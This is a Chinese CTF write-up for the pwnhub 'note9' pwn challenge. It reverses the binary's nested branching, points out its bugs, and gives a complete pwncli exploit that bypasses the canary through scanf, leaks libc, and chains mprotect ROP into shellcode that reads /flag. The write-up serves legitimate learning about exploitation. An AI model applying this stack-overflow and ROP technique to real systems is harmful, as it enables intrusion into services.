# pwnhub-12月内部赛pwn-note9-wp



### 总结

刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了......不过这道题其实就是披着逆向的栈溢出的题，只不过需要用`scanf`绕过`canary`。做完本题后，总结如下：

- `scanf`绕过`canary`，这个算是基础考点，如果是`%d`，可以用`-`号绕过，如果是`%u`，可以用`+`等特殊字符绕过，这样就不会覆盖待写入地址的原有内容。
- 高版本的`IDA`有一个快捷键`%`，可以进行花括号跳转，这样就不会看错位了；另外`IDA 7.0`有一个`hexlight`插件，可以高亮显示括号，可以从[这里下载](https://bbs.pediy.com/thread-226099-1.htm)。
- 可根据`unsorted bin`的`fd`或`bk`指针残留的地址猜测`libc`的版本。附件没有给`libc`，我是根据这个地址猜出来`libc`版本是`2.31`，后来验证了一下，的确是`libc-2.31.so BuildID[sha1]=099b9225bcb0d019d9d60884be583eb31bb5f44e`。
- `snprintf`的返回值是待写入的字符串的长度，而不是指定的那个`size`的值。例如`snprintf(dest, 4, "%s", "123456789");`的返回值是`strlen("123456789")`，是`9`而不是`4`。
- 做题时眼神要好，刚开始看错位了一个大括号，一度怀疑题目是不是出错了......

<!-- more -->

### 题目分析

#### checksec

![image-20211222225152970](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225152970.png)

#### 函数分析

很多函数中加了很多地址无关代码和数据，做题的时候忽视这些变量即可，和主流程没有任何关系，不过刚开始肯定是要踩坑的，以为这些变量很重要......

##### main

![image-20211222225747924](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225747924.png)

有些函数我已重命名，接下来会一个一个分析

##### sub_14D7

![image-20211222225532526](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225532526.png)

初始化函数，只需要看框出来的地方即可。一顿操作后，得到了一个`0x500`大小的`unsorted bin chunk`。

##### sub_12CD

这个地方函数识别有问题，可以在这个`0x12cd`地址，先按下`u`键`undefine`，再按下`c`转为汇编代码，再按`p`提取函数，发现其实就是设置沙盒。检测一波：

![image-20211222230005651](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230005651.png)

##### sub_19D6

![image-20211222230255510](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230255510.png)

流程为：

- 读取用户输入的大小，调用`malloc`
- 分配堆内存，然后读取用户输入
- 读取用户输入的`16`个整数，存储在`0x66E0`处的数组。这里我直接把数组的元素依次命名为`a0, a1, ...a15`。

##### sub_2F1D

开始处理的入口函数，也就是从这里开始，函数有点绕了。这里我用`python`的缩进来分析各个分支。

![image-20211222230825905](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230825905.png)

提取主要流程如下：

```python
sub_2F1D:
	a0 < a15:
		a1 < a13:
			a2 > a10:
				a3 != a11:
					a4 < a12 and a5 < a14 and a6 + a7 > a8 + a9:
						read_input(ptr, size)
					show_ptr()
					return
				sub_2907()
			sub_2514()
		sub_20F7()
```

后续的函数都可以这么分析，这样整理后流程看起来就清晰多了。这里可以发现，在`show_ptr`后有个`return`，由于程序使用的是`malloc`，且`read_input`函数里面也没有`\x00`截断，因此此处可以泄露出`main_arena+XX`的地址。

接下来直接给出其他函数的主要流程。

##### sub_1ED8(show_ptr)

```python
sub_1ED8(show_ptr):
	a4 > a12:
		a5 < a14:
			a6 + a7 == a8 + a9:
				puts(ptr)
```

##### sub_2907

```python
sub_2907:
	a1 < a13:
		a2 > a10:
			read(0, buf1, 0x50) buf1: 0x60C0
			a3 == a11:
				a4 > a12:
					a5 < a14 and a6 + a7 > a8 + a9:
						snprintf(buf2, 0xAuLL, "%s", buf1) buf2: 0x63E0
						return
				sub_2CFB()
			show_ptr()
			return
		sub_2907()
	sub_2514()
```

##### sub_2CFB

```python
sub_2CFB:
	read(0, buf1, 0x500)
	res = snprintf(buf2, 0xAuLL, "%s", buf1)
	for i in range(res):
		scanf(%d, &stack_var)
	puts(buf1)
```

##### sub_2514

```python
sub_2514:
	a1 > a13:
		a2 > a10:
			read(0, buf1, 0x20)
			a3 != a11:
				a5 < a14 and a6 + a7 > a8 + a9:
					for _ in range(stack_var1):
						scanf("%d", &stack_var2)
					return
				sub_2514()
			show_ptr()
		sub_2CFB()
	sub_2907()
```

##### sub_2F07

```python
sub_20F7:
	a1 > a13:
		a2 > a10:
			read(0, buf1, 0x200)
			a3 != a11:
				a4 > a12:
					a5 < a14 and a6 + a7 > a8 + a9:
						res = snprintf(buf2, 0xAuLL, "%s", buf1)
						for _ in range(res):
							scanf("%d", &stack_var)
						return
				sub_2CFB()
			show_ptr()
		sub_2907()
	sub_2514()
```

#### 漏洞点

目前发现的漏洞点有：

- `sub_2F1D`的那个`return`分支可以往`ptr`写内容，同时可以泄露`libc`地址

  ![image-20211223001548613](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001548613.png)

- `sub_2CFB`，可以溢出写`buf1`覆盖`ptr`

  ![image-20211223001640142](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001640142.png)

- `sub_2514`，`for`循环的边界是一个未初始化的变量：

  ![image-20211222234309099](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222234309099.png)

- `sub_2F07`，漏洞就在于`snprintf`，最大的返回值可以是`0x200`，之后存在栈溢出，因为`4 * 0x200 > 0x110`。

  ![2021-12-23_001013](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/2021-12-23_001013.png)

  

### 利用思路

分析完主要函数的流程后，利用思路很清晰，主要分两步：

- 利用`malloc`残留的指针泄露的地址，为了避免出现套娃情况，这里直接使用`sub_2F1D`函数打印信息后返回的那个分支
- 利用`sub_2F07`中的栈溢出进行`ROP`，我这里使用`mprotect+shellcode`读取`flag`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def assign_val(chunk_size, data, arrays):
    io.sendafter("hhh\n", "1".ljust(4, "\x00"))
    io.sendlineafter("size???\n", str(chunk_size))
    io.sendline(data)
    io.recvline("Lucky Numbers\n")
    for i in arrays:
        io.sendline(str(i))


def get_array(*indexs):
    arr = [0] * 16
    for i in indexs:
        arr[i] = 3
    return arr


def leak_addr():
    arr = get_array(15, 13, 2, 3, 4, 14)
    assign_val(0x500, "a"*8, arr)
    io.sendafter("hhh\n", "2".ljust(4, "\x00"))
    libc_base = recv_libc_addr(io, offset=0x1ebbe0)
    log_libc_base_addr(libc_base)
    libc.address = libc_base


def rop_attack():
    arr = get_array(15, 1, 2, 3, 4, 14, 6)
    assign_val(0x10, "deadbeef", arr)
    io.sendafter("hhh\n", "2".ljust(4, "\x00"))
    io.sendafter("xmki\n", cyclic(0x200, n=8))
    for _ in range(0x42):
        io.sendline(str(0x61616161))
    io.sendline("-")
    io.sendline("-")
    io.sendline(str(0x61616161))
    io.sendline(str(0x61616161))

    rop = ROP(libc)
    target_addr = libc.sym['__free_hook'] & ~0xfff
    rop.mprotect(target_addr, 0x1000, 7)
    rop.read(0, target_addr, 0x600)
    rop.call(target_addr)
    print(rop.dump())
    payload = rop.chain()

    for i in range(0, len(payload), 4):
        num = u32(payload[i:i+4])
        io.sendline(str(num))
    for _ in range(0x200-0x42-4-(len(payload) // 4)):
        io.sendline(str(0x61616161))
    
    sleep(1)

    io.sendline(b"\x90"*0x100 + asm(shellcraft.cat("/flag")))
    flag = io.recvregex("flag{.*}")
    if flag:
        success(f"Get flag: {flag}")
    else:
        error("Cannot get flag!")
    io.interactive()


def exp():
    leak_addr()
    rop_attack()

    if __name__ == "__main__":
    exp()
```

最后远程打：

![image-20211223213824409](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223213824409.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/  

